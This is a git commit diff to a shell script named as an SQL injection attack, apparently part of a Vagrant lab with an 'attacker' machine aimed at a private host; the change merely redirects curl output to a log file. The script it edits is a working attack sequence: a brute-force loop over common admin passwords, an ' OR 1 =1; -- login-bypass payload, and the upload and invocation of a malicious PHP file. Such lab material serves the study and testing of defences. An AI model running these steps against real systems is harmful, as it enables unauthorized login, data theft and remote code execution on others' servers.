067ace923b4381c0b9b82b941cfc97e7ccdb7bdd
Alexander Poschenreithner <alexander.poschenreithner@gmail.com>
2017-11-16 19:13:26 +0100

    Hide curl output, just send it to the log file

--- infrastructure/attacker/share/attack-scripts/04_sql_injection.sh
+++ infrastructure/attacker/share/attack-scripts/04_sql_injection.sh
@@ -7,7 +7,10 @@
 
 # Do first normal request
 echo "     => Calling Website..."
-curl 10.11.12.10
+curl -s -o /tmp/attack.log 10.11.12.10 
+
+# Get some webserver information
+curl -s -o /tmp/attack.log http://10.11.12.10/forSureIdoNotExist999999999.php
 
 # Some automated tries with standard values
 echo "     => Bruteforcing some standard passwords"
@@ -15,14 +18,14 @@ declare -a arr=("password" "password123" "123456" "admin" "abcd" "Scions Verlag"
 for password in "${arr[@]}"
 do
 	echo "       => $password"
-    curl -X POST -F "username=admin" -F "password=$password" -F "login=Login" http://10.11.12.10/index.php >> /tmp/attack.log
+    curl -s -o /tmp/attack.log -X POST -F "username=admin" -F "password=$password" -F "login=Login" http://10.11.12.10/index.php 
 done
 
 # Now the SQL Injection
 echo "     => SQL Injection"
-curl -X POST -F "username=' OR 1 =1; --" -F "password=x" -F "login=Login" http://10.11.12.10/index.php >> /tmp/attack.log
+curl -s -o /tmp/attack.log -X POST -F "username=' OR 1 =1; --" -F "password=x" -F "login=Login" http://10.11.12.10/index.php 
 
 # Try to upload bad php file and call it... 
 echo "     => Now upload a bad PHP File and call it"
-curl -v -F "submit=Upload Report" -F "file=@/vagrant_data/badPHP.php" http://10.11.12.10/report.php >> /tmp/attack.log
-curl http://10.11.12.10/upload/badPHP.php >> /tmp/attack.log
+curl -s -o /tmp/attack.log -F "submit=Upload Report" -F "file=@/vagrant_data/badPHP.php" http://10.11.12.10/report.php 
+curl -s -o /tmp/attack.log http://10.11.12.10/upload/badPHP.php 
